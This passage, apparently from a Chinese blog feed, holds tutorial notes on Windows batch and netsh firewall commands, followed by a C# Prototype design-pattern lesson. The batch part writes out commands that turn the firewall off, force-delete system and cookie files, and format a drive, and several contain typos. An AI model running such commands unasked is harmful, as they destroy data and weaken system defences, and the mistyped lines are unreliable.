title="防火墙配置"></a>防火墙配置</h3><p>​        Netsh(Network Shell)是Windows系统提供的功能强大的网络配置命令行工具。</p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>​        添加防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 添加通过防火墙的程序：add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=enable:: 添加通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM":: 添加禁止通过防火墙的程序：add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=disable:: 添加禁止通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM":: 禁止程序访问外部网络add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=enable scope=subnet:: 添加通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM",但该程序只能访问本地网络，禁止访问外部网络:: 定制程序网络访问范围add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=enable scope=custom address=192.168.1.12,192.168.1.13:: 添加通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM",但程序只能访问IP为”192.168.1.12“和”192.168.1.13“的网络:: 添加允许使用TCP协议的端口add portopening protocol=tcp port=8888 name=重要服务 mode=enable:: 添加远程程序访问本地计算机（建立TCP连接）时的端口（端口为”8888“，端口名称为”重要服务“):: 添加UDP协议使用的端口add portopening protocol=udp port=8888 name=重要服务 mode=enable:: 添加远程程序访问本地计算机（建立UDP连接）时的端口（端口为”8888“，端口名称为”重要服务“):: 添加所有协议都可以使用的端口add portopening protocol=all port=8888 name=重要服务 mode=enable:: 允许防火墙的所有协议可通过的端口（端口为”8888“，端口名称为”重要服务“):: 限制外部连接使用端口add portopening protocol=tcp port=8888 name=重要服务 mode=enable SCOP=Subnet:: 限制外部网络通过TCP连接方式与本地计算机的”8888“端口进行通信的计算机:: 定制访问端口的连接add portopening protocol=tcp port=8888 name=重要服务 mode=enable scop=custom address=192.168.1.12,192.168.2.0:: 定制访问端口的连接方式为TCP连接，并且设定IP为“192.168.1.12”的计算机和网路号为“192.168.2”的网络可以通过端口"8888"以TCP连接方式访问本地计算机:: 为指定的网络连接添加可用端口add portopening protocol=tcp port=8888 name=重要服务 mode=enable interface=本地连接:: 为名为“本地连接”的网络连接添加一个以TCP方式连接的端口(8888)，并且将该端口的名称命名为“重要服务”</code></pre><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>​        删除防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">delete allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe":: 删除防火墙允许的程序delete portopening protocol=tcp port=8888 interface=本地连接:: 删除通过网络连接名为“本地连接”的TCP连接端口“8888"</code></pre><h4 id="set-1"><a href="#set-1" class="headerlink" title="set"></a>set</h4><p>​        设置防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 编辑已添加的程序设置set allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" scop=custom address=192.168.1.12:: 将QQProtect程序设置为只能访问IP为”192.168.1.12“的计算机:: 编辑防火墙中已添加的端口set portopening protocol=tcp port=8888 name=重要服务 mode=enable:: 将TCP连接端口"8888"的名称设置为“重要服务”，类型为“可用”set icmpsetting type=8 mode=enable:： 启用ICMP报文回显请求set icmpsetting type=8 mode=disable:: 关闭ICMP报文回显请求set icmpsetting type=8 mode=disable interface:: 设置指定网络接口ICMP报文功能:: 指定防火墙日志文件set logging filelocation=D:\fhq.log maxfile=400:: 将防火墙的日志文件fhq.log建立在D盘，并且日志文件的最大容量为400KBset logging droppedpcket=enable:: 让防火墙记录被丢弃的数据包set logging droppedpcket=disable:: 让防火墙不记录被丢弃的数据包set logging connections=enable:: 让防火墙记录成功连接set logging connections=disable:: 让防火墙记录不成功连接set notifications mode=disable:: 禁止防火墙弹出通知对话框set notifications mode=enable:: 允许防火墙弹出通知对话框set opmode mode=enable:: 开启Windows防火墙功能set opmode mode=disable:: 关闭Windows防火墙功能set opmode mode=enable interface=本地连接:: 为指定网络接口开启防火墙set opmode mode=enable exceptions=enable:: 开启防火墙例外功能set service type=fileandprint mode=enable:: 允许文件和打印机共享服务通过防火墙set service type=remotedesktop mode=enable:: 允许远程管理服务通过防火墙set service type=remoteadmin mode=enable:: 允许远程协助和远程桌面服务通过防火墙set service type=upnp mode=enable:: 允许UPnP框架服务通过防火墙set service type=all mode=enable:: 允许所有服务类型通过防火墙set service type=fileandprint mode=enable scope=subnet:: 显示外部网络使用指定类型的服务set service type=fileanprint mode enable scope=custom address=192.168.1.12:: 限制访问指定类型服务的连接reset:: 恢复防火墙默认设置</code></pre><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>​        显示防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">show allowedprogram verbose=enable:: 查看允许通过防火墙的程序show config verbose=enable:: 查看防火墙的详细配置信息show icmpsetting verbose=enable:: 查看ICMP报文设置信息show logging :: 显示防火墙配置文件设置信息show opmode:: 查看当前防火墙的工作状态show portopening cerbose=enable:: 查看防火墙端口设置信息show service verbose=enable:: 查看防火墙服务设置信息show state verbose=enable:: 查看当前防火墙工作状态信息</code></pre><h1 id="批处理应用"><a href="#批处理应用" class="headerlink" title="批处理应用"></a>批处理应用</h1><h2 id="程序的启动与关闭"><a href="#程序的启动与关闭" class="headerlink" title="程序的启动与关闭"></a>程序的启动与关闭</h2><p>​        start命令行可以用来启动程序，同时也可以使用start命令通过任务管理器来关闭程序。</p><p><strong>步骤</strong>：</p><ol><li>确定文件位置</li><li>建立批处理文件</li></ol><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">rem -------start--------rem TIMstart.batrem --------end---------@echo offstart "" "C:\Program Files (x86)\Tencent\TIM\Bin\TIM.exe"::等价于：::cd "C:\Program Files (x86)\Tencent\TIM\Bin\"::start TIM.exerem 如果不加中间的""，那么会进入cmd模式。。rem -------start--------rem TIMstop.batrem --------end---------@echo offstart taskkill /f /im TIM.exestart taskkill /f /im TXPlatform.exestart taskkill /f /im QQProtect.exe::实际上是通过“任务管理器”终止的进程来实现的</code></pre><h2 id="删除临时文件夹中的文件"><a href="#删除临时文件夹中的文件" class="headerlink" title="删除临时文件夹中的文件"></a>删除临时文件夹中的文件</h2><p>​        使用del命令快速删除指定文件夹中的文件。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 删除临时文件夹中文件color B0echo -----------------------------------------echo 开始进行文件删除操作...pausecd \c:cd \cd windows\tempdel *.* /ppause</code></pre><h2 id="自动清除系统垃圾文件"><a href="#自动清除系统垃圾文件" class="headerlink" title="自动清除系统垃圾文件"></a>自动清除系统垃圾文件</h2><p>​        Windows操作系统在安装和使用过程中会产生很多垃圾，包括临时文件(<code>*.tmp</code>、<code>*._mp</code>)、日志文件(<code>*.log</code>)、临时帮助文件(<code>*.gid</code>)、磁盘检查文件(<code>*.chk</code>)、临时备份文件(<code>*.old、*.bak</code>)以及其他临时文件。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 自动清除系统垃文件color B0echo -----------------------------------------echo 开始清除文件...pausecls@echo off:: 依次清除系统根目录中的临时文件、临时帮助文件、磁盘检查文件、临时备份文件del /f /s /q %systemdrive%\*.tmpdel /f /s /q %systemdrive%\*._mpdel /f /s /q %systemdrive%\*.giddel /f /s /q %systemdrive%\*.chkdel /f /s /q %systemdrive%\*.old:: 依次清除Windows目录中的临时备份文件、预读文件、临时文件del /f /s /q %windir%\*.bakdel /f /s /q %windir%\prefetch\*.*rd /s /q %windir%\temp & mk %windir%\temp:: 依次清除用户目录下的临时文件del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"del /f /s /q "%userprofile%\Local Setting\Temp\*.*"rd /s /q "%userprofile%\Local Setting\Temp\" & md "%userprofile%\Local Setting\Temp\":: 依次清除用户安装目录下的cookie文件、临时文件del /f /s /q "%appdata%\Microsoft\Windows\cookies\*.*"del /f /s /q "%appdata%\Microsoft\Windows\Recent\*.*"@echo offclscolor 2Eecho ---------------------系统垃清理完成！！！-----------------------echo ----------------------------------------------------------------echo ----------------------------退出--------------------------------pause</code></pre><h2 id="批量转移同一类型的文件"><a href="#批量转移同一类型的文件" class="headerlink" title="批量转移同一类型的文件"></a>批量转移同一类型的文件</h2><p>​        转移指定目录下同一类型的文件到一个指定的目录下(存在)。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 批量转移同一类型的文件color B0echo -----------------------------------------echo 开始转移文件...pauseclsmove c:\download\*.jpg d:\images:: 目的路径必须存在pause</code></pre><h2 id="用批处理批量移动、删除文件"><a href="#用批处理批量移动、删除文件" class="headerlink" title="用批处理批量移动、删除文件"></a>用批处理批量移动、删除文件</h2><p>​        使用批处理可以很方便地进行文件的批量移动或删除，出错时也很容易修改</p><p><strong>eg</strong>：</p><ul><li>将D盘.htm文件移动到E盘，再格式化D盘，然后将文件移回D盘，并将后缀改为.html。</li></ul><pre class=" language-bat"><code class="language-bat">rem --------------------------rem 1.batrem --------------------------@echo offe:md dd:copy *.htm e:\d@if exist e:\d\*.htm call 2.batrm e:\d</code></pre><pre class=" language-bat"><code class="language-bat">rem ---------------------------rem 2.batrem ---------------------------@echo offformat d: /qcopy e:\d\*.htm d:d:ren *.htm *.html</code></pre><h2 id="删除大小和类型一样的重复文件-没见效果"><a href="#删除大小和类型一样的重复文件-没见效果" class="headerlink" title="删除大小和类型一样的重复文件(没见效果)"></a>删除大小和类型一样的重复文件(没见效果)</h2><p>​        大小和类型一样的文件基本上都是重复文件，可以使用批处理文件将其删除。</p><h2 id="删除某盘内的所有空目录"><a href="#删除某盘内的所有空目录" class="headerlink" title="删除某盘内的所有空目录"></a>删除某盘内的所有空目录</h2><p><strong>eg</strong>：</p><ul><li>删除H盘中所有的空目录</li></ul><pre class=" language-bat"><code class="language-bat">@echo offtitle 删除某盘内的所有空目录color B0echo -----------------------------------------echo 开始删除所有空目录...pausedir h:\ /ad /b /s | sort /r > h:\kill.txtfor /f "delims=;" %%i in (h:\kill.txt) do rd "%%i"echo y | del h:\kill.txt:: 如需对其他磁盘进行操作，请将h磁盘替换为其他盘符clscolor 2Eecho --------------------删除某盘所有空目录操作结束-----------------echo ---------------------------------------------------------------echo ----------------------------关闭-------------------------------pause</code></pre><h2 id="转换磁盘为NTFS格式"><a href="#转换磁盘为NTFS格式" class="headerlink" title="转换磁盘为NTFS格式"></a>转换磁盘为NTFS格式</h2><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 转换磁盘为NTFS格式color B0echo -----------------------------------------echo 开始磁盘格式转换...pause@echo off@echo.convert h:/fs:ntfs:: 对其他磁盘进行格式化的时候，可将H磁盘修改为对应盘符:: 优点：->不会删除原来存在的文件clscolor 2Eecho --------------------磁盘格式转换结束-----------------echo -----------------------------------------------------echo --------------------------关闭-----------------------pause</code></pre><ul><li>NTFS格式的分区在DOS/Windows 9X下均不支持，Windows 2000之后的系统才支持</li><li>使用该方式转换不会删除磁盘中原来存在的文件</li></ul><h2 id="显示或隐藏文件扩展名"><a href="#显示或隐藏文件扩展名" class="headerlink" title="显示或隐藏文件扩展名"></a>显示或隐藏文件扩展名</h2><p><strong>eg</strong>：</p><ul><li>使用批处理程序通过修改注册表来实现扩展名的显示与隐藏</li></ul><pre class=" language-bat"><code class="language-bat">@echo offtitle 显示或隐藏文件扩展名color B0echo -----------------------------------------echo 开始执行操作...pausereg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t reg_dword /d 00000000 /f:: 键值为1隐藏；键值为0显示clscolor 2Eecho --------------------操作结束-----------------echo ---------------------------------------------echo ----------------------关闭-------------------pause</code></pre><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考链接：</p><p><a href="https://www.cnblogs.com/DswCnblog/category/820715.html" target="_blank" rel="noopener">dsw846</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/category/1081980.html" target="_blank" rel="noopener">Angel_Kitty</a></p><p>相关材料：</p><p><a href="../BatchFiles">批处理库</a></p><p><a href="../XMind/批处理思维导图.xmind">批处理思维导图</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 批处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 批处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型模式</title>
      <link href="/2020/08/22/yuan-xing-mo-shi/"/>
      <url>/2020/08/22/yuan-xing-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        原型模式(Prototype)是一种创建型设计模式，用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</p><p>​        <font color="blue">原型模式其实就是从一个对象再创建一个可定制的对象，而且不需知道任何创建的细节。</font></p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><strong>客户端(Client)</strong>：通过调用原型类的克隆操作创建一个新对象。</li><li><strong>原型类(Prototype)</strong>：声明一个接口用于克隆自己。</li><li><strong>具体原型类(ConcretePrototype)</strong>：实现克隆自己的操作。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/原型模式经典结构.png" alt="原型模式经典结构"></center><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>创建一个原型类，并定义一个克隆自己的接口(或抽象方法)</li><li>实现一个具体原型类，在类体中实现原型类中克隆自己的操作</li><li>在客户端调用具体原型类的Clone()方法完成对象的克隆操作</li></ol><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>Prototype抽象原型类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 抽象原型类</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Prototype</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">string</span> id<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Constructor </span>    <span class="token keyword">public</span> <span class="token function">Prototype</span><span class="token punctuation">(</span><span class="token keyword">string</span> id<span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Property </span>    <span class="token keyword">public</span> <span class="token keyword">string</span> Id    <span class="token punctuation">{</span>         <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> id<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/// &lt;summary></span>     <span class="token comment" spellcheck="true">/// 提供的克隆接口</span>     <span class="token comment" spellcheck="true">/// &lt;/summary></span>     <span class="token comment" spellcheck="true">/// &lt;returns>返回值类型是原型类类型&lt;/returns></span>     <span class="token keyword">public</span> <span class="token keyword">abstract</span> Prototype <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>ConcretePrototype1具体原型类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 具体原型类</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">class</span> <span class="token class-name">ConcretePrototype1</span> <span class="token punctuation">:</span> Prototype<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Constructor </span>    <span class="token keyword">public</span> <span class="token function">ConcretePrototype1</span><span class="token punctuation">(</span><span class="token keyword">string</span> id<span class="token punctuation">)</span>         <span class="token punctuation">:</span> <span class="token keyword">base</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/// &lt;summary></span>     <span class="token comment" spellcheck="true">/// 实现原型类中的继承而来的虚方法</span>     <span class="token comment" spellcheck="true">/// &lt;/summary></span>     <span class="token comment" spellcheck="true">/// &lt;returns>&lt;/returns></span>     <span class="token keyword">public</span> <span class="token keyword">override</span> Prototype <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// Shallow copy </span>         <span class="token keyword">return</span> <span class="token punctuation">(</span>Prototype<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ConcretePrototype2具体原型类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 具体原型类</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">class</span> <span class="token class-name">ConcretePrototype2</span> <span class="token punctuation">:</span> Prototype<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Constructor </span>    <span class="token keyword">public</span> <span class="token function">ConcretePrototype2</span><span class="token punctuation">(</span><span class="token keyword">string</span> id<span class="token punctuation">)</span>         <span class="token punctuation">:</span> <span class="token keyword">base</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/// &lt;summary></span>     <span class="token comment" spellcheck="true">/// 实现原型类中的继承而来的虚方法</span>     <span class="token comment" spellcheck="true">/// &lt;/summary></span>     <span class="token comment" spellcheck="true">/// &lt;returns>&lt;/returns></span>     <span class="token keyword">public</span> <span class="token keyword">override</span> Prototype <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// Shallow copy </span>         <span class="token keyword">return</span> <span class="token punctuation">(</span>Prototype<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Program客户类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 客户端</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">class</span> <span class="token class-name">Program</span><span class="token punctuation">{</span>   <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>   <span class="token punctuation">{</span>       ConcretePrototype1 p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcretePrototype1</span><span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       ConcretePrototype1 c1 <span class="token operator">=</span> <span class="token punctuation">(</span>ConcretePrototype1<span class="token punctuation">)</span>p1<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"Cloned: {0}"</span><span class="token punctuation">,</span> c1<span class="token punctuation">.</span>Id<span class="token punctuation">)</span><span class="token punctuation">;</span>       ConcretePrototype2 p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcretePrototype2</span><span class="token punctuation">(</span><span class="token string">"II"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       ConcretePrototype2 c2 <span class="token operator">=</span> <span class="token punctuation">(</span>ConcretePrototype2<span class="token punctuation">)</span>p2<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"Cloned: {0}"</span><span class="token punctuation">,</span> c2<span class="token punctuation">.</span>Id<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// Wait for user </span>       Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>结果展示：</p><blockquote><p>Cloned：$\mathbf I$</p><p>Cloned：$\mathbf I$$\mathbf I$</p></blockquote><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p><strong>优点</strong>：</p><ul><li><p>隐藏对象创建的细节</p></li><li><p>大大提高程序的性能</p></li></ul><p><strong>缺点：</strong></p><ul><li>使用时较复杂，需要区分<strong>浅复制</strong>和<strong>深复制</strong></li></ul><p>注：</p><ul><li><p>浅复制与深复制：</p><ul><li><p><strong>浅复制</strong>只将类中的值类型进行复制，不会对引用类型进行复制，所有对象的引用类型指向最后一个对象对引用类型的赋值。</p></li><li><p><strong>深复制</strong>可以将类中的引用类型也完成复制。</p></li></ul></li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>​        创建的对象十分耗费空间资源，就创建一个相似的对象，在需要时对其进行克隆操作来创建一个新的对象。</p><h2 id="投简历引发的思考"><a href="#投简历引发的思考" class="headerlink" title="投简历引发的思考"></a>投简历引发的思考</h2><p>​        对于一个普通的应届毕业生来说多投简历可能就意味着有更多被选择的机会，但简历也不能千篇一律，投不同公司或职位都用同一个简历，最好对应不同的职位设计不同的简历。<font color="red">以此为需求编程实现简历复印的功能</font>。</p><h3 id="普通实现"><a href="#普通实现" class="headerlink" title="普通实现"></a>普通实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/普通实现.png" alt="普通实现"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> timeArea<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> timeArea<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>timeArea <span class="token operator">=</span> timeArea<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> timeArea<span class="token punctuation">,</span> company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：2010-2019 XX公司<br>小王 男 29<br>工作经历：2010-2019 XX公司<br>小王 男 29<br>工作经历：2010-2019 XX公司</p></blockquote><p>​        使用这个方式进行简历复制时会产生三个Resume对象，而且这三个对象存储的字面值完全相同，下面代码也能产生一致的效果但是占用的存储空间仅为上述代码实现的三分之一。</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token 